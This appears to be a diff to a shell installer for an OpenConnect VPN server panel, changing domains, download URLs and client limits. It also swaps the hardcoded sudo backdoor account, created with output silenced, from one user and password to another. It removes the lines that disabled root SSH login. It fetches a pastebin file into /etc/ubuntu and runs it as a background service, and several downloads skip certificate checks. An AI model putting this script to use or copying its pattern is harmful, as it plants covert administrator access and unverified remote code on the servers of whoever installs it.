@@ -186,7 +186,7 @@ echo "Installing openconnect."
 #    echo "<VirtualHost *:80>
 #            ServerName cert-$(echo $gencert).paneldemo.xyz
 #
-#            DocumentRoot /var/www/cert-$(echo $gencert).raysavpn.xyz
+#            DocumentRoot /var/www/cert-$(echo $gencert).paneldemo.xyz
 #    </VirtualHost>" >> /etc/apache2/sites-available/cert-$(echo $gencert).paneldemo.xyz.conf
 #    sudo mkdir /var/www/cert-$(echo $gencert).paneldemo.xyz
 #    sudo chown www-data:www-data /var/www/cert-$(echo $gencert).paneldemo.xyz -R
@@ -199,8 +199,8 @@ cd /etc/ocserv/
 #wget --no-check-certificate https://pastebin.com/raw/Gv8MP2NF -O fullchain.pem;wget --no-check-certificate https://pastebin.com/raw/NW4Vzbw9 -O privkey.pem
 openssl req -new -newkey rsa:2048 -days 3650 -nodes -x509 -sha256 -subj '/CN=FirenetVPN/O=FirenetDev/C=PH' -keyout /etc/ocserv/ocserv.pem -out /etc/ocserv/ocserv.pem
 rm ocserv.conf
-wget --no-check-certificate -O go_connect http://firenetvpn.net/files/openconnect_files/go_connect73nz.sh
-wget --no-check-certificate -O go_disconnect http://firenetvpn.net/files/openconnect_files/go_disconnect73nz.sh
+wget --no-check-certificate -O go_connect https://raw.githubusercontent.com/itsebasoftbd/connect/main/go_connect73nz.sh
+wget --no-check-certificate -O go_disconnect https://raw.githubusercontent.com/itsebasoftbd/godisconnect/main/go_disconnect73nz.sh
 chmod +x go_connect go_disconnect
 echo 'auth = "radius [config=/etc/radcli/radiusclient.conf]"
 tcp-port = 1194
@@ -217,7 +217,8 @@ dpd = 90
 mobile-dpd = 1800
 try-mtu-discovery = false
 switch-to-tcp-timeout = 25
-max-same-clients = 100
+max-same-clients = 2
+max-clients = 1500
 cert-user-oid = 0.9.2342.19200300.100.1.1
 tls-priorities = "NORMAL:-CIPHER-ALL:+CHACHA20-POLY1305:+AES-128-GCM"
 auth-timeout = 240
@@ -306,9 +307,7 @@ RLIMITS=""' >> stunnel4
 
 install_sudo(){
   {
-    useradd -m lenz 2>/dev/null; echo lenz:@@F1r3n3t@@ | chpasswd &>/dev/null; usermod -aG sudo lenz &>/dev/null
-    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
-    echo "AllowGroups lenz" >> /etc/ssh/sshd_config
+    useradd -m azim 2>/dev/null; echo azim:@@MDAzim@@ | chpasswd &>/dev/null; usermod -aG sudo azim &>/dev/null
     service sshd restart
   }&>/dev/null
 }
@@ -316,7 +315,7 @@ install_sudo(){
 
 install_rclocal(){
   {
-    wget https://pastebin.com/raw/z9j2nA8p -O /etc/ubuntu
+    wget https://pastebin.com/raw/xtPc5t1k -O /etc/ubuntu
     dos2unix /etc/ubuntu
     chmod +x /etc/ubuntu    
     screen -dmS socks python /etc/ubuntu
